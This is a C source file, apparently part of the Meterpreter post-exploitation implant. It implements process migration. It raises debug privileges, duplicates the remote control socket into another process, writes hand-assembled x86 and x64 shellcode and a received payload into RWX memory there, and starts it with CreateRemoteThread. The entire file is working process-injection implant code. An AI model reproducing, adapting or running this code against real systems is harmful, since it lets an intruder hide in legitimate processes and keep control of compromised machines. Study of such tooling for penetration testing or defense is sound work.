#include "common.h"


/*
 * core_migrate
 * ------------
 *
 * Migrates the remote connection descriptor into the context of
 * another process and exits the current process or thread.  This is
 * accomplished by duplicating the socket handle into the context
 * of another process and injecting a code stub that reads in
 * an arbitrary stage that may or may not re-initialize the 
 * meterpreter server instance in the new process.
 *
 * req: TLV_TYPE_MIGRATE_PID - The process identifier to migrate into.
 */

typedef struct _MigrationStubContext
{
	                                // x86      |  x64
	                                // =========================
	LPVOID           loadLibrary;   // esi+0x00 | rbp+0x00
	LPVOID           payloadBase;   // esi+0x04 | rbp+0x08
	DWORD            payloadLength; // esi+0x08 | rbp+0x10
	LPVOID           wsaStartup;    // esi+0x0c | rbp+0x18
	LPVOID           wsaSocket;     // esi+0x10 | rbp+0x20
	LPVOID           recv;          // esi+0x14 | rbp+0x28
	LPVOID           setevent;      // esi+0x18 | rbp+0x30
	LPVOID           event;         // esi+0x1c | rbp+0x38
	CHAR             ws2_32[8];     // esi+0x20 | rbp+0x40
	WSAPROTOCOL_INFO info;          // esi+0x28 | rbp+0x48
} MigrationStubContext;

DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
{
	MigrationStubContext context;
	TOKEN_PRIVILEGES privs;
	HANDLE token = NULL;
	Packet *response = packet_create_response(packet);
	HANDLE process = NULL;
	HANDLE thread = NULL;
	HANDLE event = NULL;
	LPVOID dataBase;
	LPVOID codeBase;
	DWORD threadId;
	DWORD result = ERROR_SUCCESS;
	DWORD pid;
	PUCHAR payload;

#ifdef _WIN64
	BYTE stub[] =
		"\x48\x89\xCD"                 //  mov rbp, rcx          ; rcx = MigrationStubContext *
		"\x48\x81\xEC\x00\x40\x00\x00" //  sub esp, 0x4000       ; alloc space on stack
		"\x49\x89\xE7"                 //  mov r15, rsp          ; save pointer to space for WSAStartup
		"\x48\x81\xEC\x28\x00\x00\x00" //  sub esp, 0x28         ; alloc space for function calls
		"\x48\x8D\x4D\x40"             //  lea rcx, [rbp+0x40]   ; rcx = MigrationStubContext->ws2_32
		"\xFF\x55\x00"                 //  call qword [rbp+0x0]  ; kernel32!LoadLibraryA( "ws2_32" );
		"\x4C\x89\xFA"                 //  mov rdx, r15          ;
		"\x6A\x02"                     //  push byte +0x2        ;
		"\x59"                         //  pop rcx               ; rcx = 2
		"\xFF\x55\x18"                 //  call qword [rbp+0x18] ; ws2_32!WSAStartup( 2, &buff );
		"\x4D\x31\xC0"                 //  xor r8, r8            ; zero  r8
		"\x41\x50"                     //  push r8               ; null
		"\x41\x50"                     //  push r8               ; null
		"\x4C\x8D\x4D\x48"             //  lea r9, [rbp+0x48]    ; r9 = &WSAPROTOCOL_INFO
		"\x6A\x02"                     //  push byte +0x2        ;
		"\x5A"                         //  pop rdx               ; rdx = 2
		"\x6A\x01"                     //  push byte +0x1        ;
		"\x59"                         //  pop rcx               ; rcx = 2
		"\xFF\x55\x20"                 //  call qword [rbp+0x20] ; ws2_32!WSASocket( 2, 2, 0, &info, 0, 0 );
		"\x48\x89\xC7"                 //  mov rdi, rax          ; rdi now is our socket
		"\x48\x8B\x4D\x38"             //  mov rcx, [rbp+0x38]   ; rcx = the event
		"\xFF\x55\x30"                 //  call qword [rbp+0x30] ; kernel32!SetEvent( event );
		"\x48\x8B\x45\x08"             //  mov rax, [rbp+0x8]    ; get the main payloads address
		"\x48\x81\xE4\xF0\xFF\xFF\xFF" //  and esp, 0xfffffff0   ; ensure rsp is 16 byte aligned
		"\x48\x89\xE5"                 //  mov rbp, rsp          ; give rbp a real value
		"\x48\x81\xEC\x28\x00\x00\x00" //  sub esp, 0x28         ; alloc some space on stack
		"\xFF\xE0";                    //  jmp rax               ; jump into the main payload
#else
	BYTE stub[] =
		"\x8B\x74\x24\x04"         //  mov esi,[esp+0x4]         ; ESI = MigrationStubContext *
		"\x89\xE5"                 //  mov ebp,esp               ; create stack frame
		"\x81\xEC\x00\x40\x00\x00" //  sub esp, 0x4000           ; alloc space on stack
		"\x8D\x4E\x20"             //  lea ecx,[esi+0x20]        ; ECX = MigrationStubContext->ws2_32
		"\x51"                     //  push ecx                  ; push "ws2_32"
		"\xFF\x16"                 //  call near [esi]           ; call loadLibrary
		"\x54"                     //  push esp                  ; push stack address
		"\x6A\x02"                 //  push byte +0x2            ; push 2
		"\xFF\x56\x0C"             //  call near [esi+0xC]       ; call wsaStartup
		"\x6A\x00"                 //  push byte +0x0            ; push null
		"\x6A\x00"                 //  push byte +0x0            ; push null
		"\x8D\x46\x28"             //  lea eax,[esi+0x28]        ; EAX = MigrationStubContext->info
		"\x50"                     //  push eax                  ; push our duplicated socket
		"\x6A\x00"                 //  push byte +0x0            ; push null
		"\x6A\x02"                 //  push byte +0x2            ; push 2
		"\x6A\x01"                 //  push byte +0x1            ; push 1
		"\xFF\x56\x10"             //  call near [esi+0x10]      ; call wsaSocket
		"\x97"                     //  xchg eax,edi              ; edi now = our duplicated socket
		"\xFF\x76\x1C"             //  push dword [esi+0x1C]     ; push our event
		"\xFF\x56\x18"             //  call near [esi+0x18]      ; call setevent
		"\xFF\x76\x04"             //  push dword [esi+0x04]     ; push the address of the payloadBase
		"\xC3";                    //  ret                       ; return into the payload
#endif
	// Get the process identifier to inject into
	pid = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);

	// Bug fix for Ticket #275: get the desired length of the to-be-read-in payload buffer...
	context.payloadLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_LEN);

	// Receive the actual migration payload (metsrv.dll + loader)
	payload = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);

	// Try to enable the debug privilege so that we can migrate into system
	// services if we're administrator.
	if (OpenProcessToken(
			GetCurrentProcess(),
			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
			&token))
	{
		privs.PrivilegeCount           = 1;
		privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME,
				&privs.Privileges[0].Luid);
	
		AdjustTokenPrivileges(token, FALSE, &privs, 0, NULL, NULL);

		CloseHandle(token);
	}

	do
	{
		// Open the process so that we can into it
		if (!(process = OpenProcess(
				PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | 
				PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid)))
		{
			result = GetLastError();
			break;
		}

		// If the socket duplication fails...
		if (WSADuplicateSocket(remote_get_fd(remote), pid, &context.info) != NO_ERROR)
		{
			result = WSAGetLastError();
			break;
		}

		// Create a notification event that we'll use to know when
		// it's safe to exit (once the socket has been referenced in
		// the other process)
		if (!(event = CreateEvent(NULL, TRUE, FALSE, NULL)))
		{
			result = GetLastError();
			break;
		}

		// Duplicate the event handle into the target process
		if (!DuplicateHandle(GetCurrentProcess(), event,
				process, &context.event, 0, TRUE, DUPLICATE_SAME_ACCESS))
		{
			result = GetLastError();
			break;
		}

		// Initialize the migration context
		context.loadLibrary    = (LPVOID)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
		context.wsaStartup     = (LPVOID)GetProcAddress(GetModuleHandle("ws2_32"), "WSAStartup");
		context.wsaSocket      = (LPVOID)GetProcAddress(GetModuleHandle("ws2_32"), "WSASocketA");
		context.recv           = (LPVOID)GetProcAddress(GetModuleHandle("ws2_32"), "recv");
		context.setevent       = (LPVOID)GetProcAddress(GetModuleHandle("kernel32"), "SetEvent");

		strcpy(context.ws2_32, "ws2_32");

		// Allocate storage for the stub and context
		if (!(dataBase = VirtualAllocEx(process, NULL, sizeof(MigrationStubContext) + sizeof(stub), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
		{
			result = GetLastError();
			break;
		}

		// Bug fix for Ticket #275: Allocate a RWX buffer for the to-be-read-in payload...
		if (!(context.payloadBase = VirtualAllocEx(process, NULL, context.payloadLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
		{
			result = GetLastError();
			break;
		}

		// Initialize the data and code base in the target process
		codeBase = (PCHAR)dataBase + sizeof(MigrationStubContext);

		if (!WriteProcessMemory(process, dataBase, &context, sizeof(context), NULL))
		{
			result = GetLastError();
			break;
		}

		if (!WriteProcessMemory(process, codeBase, stub, sizeof(stub), NULL))
		{
			result = GetLastError();
			break;
		}

		if (!WriteProcessMemory(process, context.payloadBase, payload, context.payloadLength, NULL))
		{
			result = GetLastError();
			break;
		}

		// Send a successful response to let them know that we've pretty much
		// successfully migrated and are reaching the point of no return
		packet_transmit_response(result, remote, response);
		
		// XXX: Skip SSL shutdown/notify, as it queues a TLS alert on the socket.
		// Shut down our SSL session
		// ssl_close_notify(&remote->ssl);
		// ssl_free(&remote->ssl);


		response = NULL;

		// Create the thread in the remote process
		if (!(thread = CreateRemoteThread(process, NULL, 1024*1024, (LPTHREAD_START_ROUTINE)codeBase, dataBase, 0, &threadId)))
		{
			result = GetLastError();
			ExitThread(result);
		}

		// Wait at most 5 seconds for the event to be set letting us know that
		// it's finished
		if (WaitForSingleObjectEx(event, 5000, FALSE) != WAIT_OBJECT_0)
		{
			result = GetLastError();
			ExitThread(result);
		}
		

		// Exit the current process now that we've migrated to another one
		dprintf("Shutting down the Meterpreter thread...");
		ExitThread(0);

	} while (0);

	// If we failed and have not sent the response, do so now
	if (result != ERROR_SUCCESS && response)
		packet_transmit_response(result, remote, response);

	// Cleanup
	if (process)
		CloseHandle(process);
	if (thread)
		CloseHandle(thread);
	if (event)
		CloseHandle(event);

	return ERROR_SUCCESS;
}


